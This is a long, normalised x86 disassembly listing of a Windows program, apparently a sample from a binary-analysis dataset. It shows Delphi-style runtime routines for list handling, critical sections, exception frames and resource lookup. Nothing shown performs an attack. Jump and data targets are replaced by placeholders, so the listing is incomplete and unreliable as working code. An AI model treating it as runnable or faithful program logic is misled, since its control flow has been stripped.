mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_4175e4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4172b4
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4185a4
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_417658
push ebx
push esi
push edi
push ebp
call sub_4034f4
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
mov eax [ esi + 0x4 ]
mov edx edi
call sub_418700
call sub_403128
inc edi
dec ebp
jne r-xdata
sub_4176b4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_418700
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_417244
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_4176f8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_417370
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_418700
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_41773c
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_4177bf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_403078
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b838
call sub_4038f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4177c6
lea eax [ ebp - 0x10c ]
call sub_403eb8
retn
sub_4177cc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4176b4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4171d8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_41773c
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_418700
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418700
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403354
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4176b4
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4185f0
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4185a4
sub_4178b8
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418700
mov edx ebp
call sub_4174bc
test al al
jne r-xdata
sub_4178fc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4172b4
mov edx eax
mov eax [ edi + 0x4 ]
call sub_4185a4
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418700
mov eax [ eax + 0xc ]
mov edx ebp
call sub_41875c
test eax eax
jge r-xdata
sub_417958
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418700
mov esi eax
mov edx ebp
mov eax esi
call sub_4174f4
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_403128
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4185f0
sub_4179a8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4030f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_417894
xor eax eax
push ebp
push sub_417aa7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417aae
mov eax [ rw-data ]
call sub_41794c
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4185a4
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_418700
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4173d0
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4185a4
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_418700
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_417aae
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_417ad4
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_417b04
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_417894
xor edx edx
push ebp
push sub_417b7b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41794c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_4039a0
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418700
mov edx [ ebp - 0x4 ]
call sub_417370
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_417b98
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_417bf8
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b838
call sub_4038f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417bff
lea eax [ ebp - 0xc ]
call sub_403eb8
retn
sub_417c04
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417894
xor eax eax
push ebp
push sub_417c4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_4176f8
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417c51
mov eax [ rw-data ]
call sub_41794c
retn
sub_417c58
push ebx
push esi
mov esi eax
mov eax esi
call sub_417c04
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_417b98
sub_417c78
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417894
xor eax eax
push ebp
push sub_417cdd
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4178b8
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4178a0
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417ce4
mov eax [ rw-data ]
call sub_41794c
retn
mov eax ebx
call sub_4030b4
mov ebx eax
sub_417ce8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417894
xor eax eax
push ebp
push sub_417d2a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_417958
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417d31
mov eax [ rw-data ]
call sub_41794c
retn
sub_417d34
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417894
xor eax eax
push ebp
push sub_417d76
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_4178fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417d7d
mov eax [ rw-data ]
call sub_41794c
retn
sub_417d80
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_417894
xor eax eax
push ebp
push sub_417dc7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_4177cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417dce
mov eax [ rw-data ]
call sub_41794c
retn
sub_417dd4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417894
xor eax eax
push ebp
push sub_417e22
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_417598
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417e29
mov eax [ rw-data ]
call sub_41794c
retn
sub_417e88
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_40348c
pop ebp
retn 0x8
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_417ec0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_417e88
mov edx eax
mov eax [ rw-data ]
call sub_418a3c
pop edi
pop esi
pop ebx
retn
sub_417eec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_418ac4
mov esi eax
xor edx edx
push ebp
push sub_417f56
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418b28
retn
mov edx ebx
mov eax esi
call sub_418700
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
call sub_4039a0
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417f68
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_418ac4
mov esi eax
xor edx edx
push ebp
push sub_417fd2
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418b28
retn
mov edx ebx
mov eax esi
call sub_418700
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_4039a0
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417fe4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_407e74
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_418024
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_403f0c
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_418068
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_41875c
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_4185a4
sub_4180c0
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_418700
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_418100
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_4180c0
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_418124
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_404378
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b6dc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418198
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_41b178
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403128
retn
sub_4181a8
push ebx
call sub_405ee4
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_405ee4
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_4185a4
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov ebx eax
call sub_405ee4
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov ebx eax
call sub_405ee4
mov [ eax + 0xc ] ebx
sub_418200
push ebx
push esi
push edi
call sub_405ee4
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_418700
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_418230
push ebx
push esi
call sub_405ee4
mov eax [ eax + 0x8 ]
call sub_403128
call sub_405ee4
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_4187e8
mov esi eax
call sub_405ee4
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_4185f0
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_405ee4
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_403128
sub_41828c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_418322
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418329
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4030b4
call sub_41828c
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403078
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40411c
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_405160
call sub_4051b0
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_418124
or bl al
sub_418334
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_4183e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4183c3
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_403070
call sub_41828c
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_4181a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4183ca
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_418200
retn
call sub_418230
sub_4183f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
push 0x400
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b860
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
xor eax eax
push ebp
push sub_418455
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41e9e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41845c
mov eax [ ebp - 0x4 ]
call sub_403128
retn
sub_418464
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax ebx
call sub_403070
push eax
mov eax esi
call sub_403070
pop edx
cmp edx eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
call sub_419538
push eax
mov eax esi
call sub_419538
pop edx
cmp edx eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_418571
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4183f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_418554
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4183f8
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407e00
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41855b
mov eax [ ebp - 0xc ]
call sub_403128
retn
mov al 0x1
sub_418584
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_4185a4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4185f0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41868c
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028c8
mov edx esi
mov eax ebx
call sub_418700
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418654
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_418650
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b838
jmp sub_4038f4
sub_41868c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_4186d4
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405c78
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_418654
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4186db
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_418700
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41868c
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_418728
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_4188bc
retn
sub_41875c
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_41877c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41868c
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4028c8
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4187f4
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp esi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41868c
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebx
call sub_418700
mov ebp eax
